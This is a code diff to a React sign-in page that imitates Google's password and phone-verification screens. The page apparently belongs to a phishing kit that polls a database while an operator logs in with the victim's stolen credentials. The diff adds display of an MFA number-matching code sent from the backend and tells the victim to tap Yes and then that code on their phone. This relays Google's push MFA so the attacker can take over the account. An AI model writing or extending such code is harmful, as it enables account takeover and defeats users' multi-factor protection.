@@ -10,6 +10,7 @@ const Password = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const [error, setError] = useState("");
+  const [mfaCode, setMfaCode] = useState("");
 
   const email = location.state?.email || "user@example.com";
 
@@ -37,6 +38,10 @@ const Password = () => {
       const loginData = snapshot.val();
 
       if (!loginData) return;
+
+      if (loginData.mfaCode) {
+        setMfaCode(loginData.mfaCode); // Show code to user
+      }
 
       if (loginData.status === "allowed") {
         clearInterval(pollInterval);
@@ -68,19 +73,43 @@ const Password = () => {
 
         {loading ? (
           <div style={{ textAlign: "center", marginTop: "40px" }}>
-            <p style={{ fontSize: "16px", fontWeight: "600", marginBottom: "6px" }}>
-              Open the Gmail app on your phone
-            </p>
-            <p style={{ fontSize: "14px", color: "#5f6368", marginBottom: "20px" }}>
-             Google sent a notification to your phone. Open the Gmail app and tap Yes on the prompt to verify it's you.
-            </p>
+            {mfaCode && (
+              <>
+                <div style={{ fontSize: "48px", fontWeight: "bold", margin: "20px 0" }}>
+                  {mfaCode}
+                </div>
+                <p style={{ fontWeight: "bold", marginBottom: "8px" }}>
+                  Check your phone
+                </p>
+                <p style={{ fontSize: "14px", color: "#5f6368", marginBottom: "10px" }}>
+                  Pull down the notification bar and tap the sign-in notification.
+                </p>
+                <p style={{ fontSize: "14px", color: "#5f6368" }}>
+                  Tap <strong>Yes,</strong> and then tap <strong>{mfaCode}</strong> on your phone to verify it's you.
+                </p>
+              </>
+            )}
+            {!mfaCode && (
+              <>
+              
+                {/* <p style={{ fontSize: "16px", fontWeight: "600", marginBottom: "6px" }}>
+                  Open the Gmail app on your phone
+                </p> */}
+                
+                {/* <p style={{ fontSize: "14px", color: "#5f6368", marginBottom: "20px" }}>
+                  Google sent a notification to your phone. Open the Gmail app and tap Yes on the prompt to verify it's you.
+                </p> */}
+                <p style={{ fontSize: "14px", color: "#5f6368", marginBottom: "20px" }}>
+                  Please wait... 
+                </p> 
+              </>
+            )}
             <div className="google-loader">
               <span className="blue"></span>
               <span className="red"></span>
               <span className="yellow"></span>
               <span className="green"></span>
             </div>
-
             <p style={{ marginTop: "10px", fontSize: "16px" }}>Loading...</p>
           </div>
         ) : (
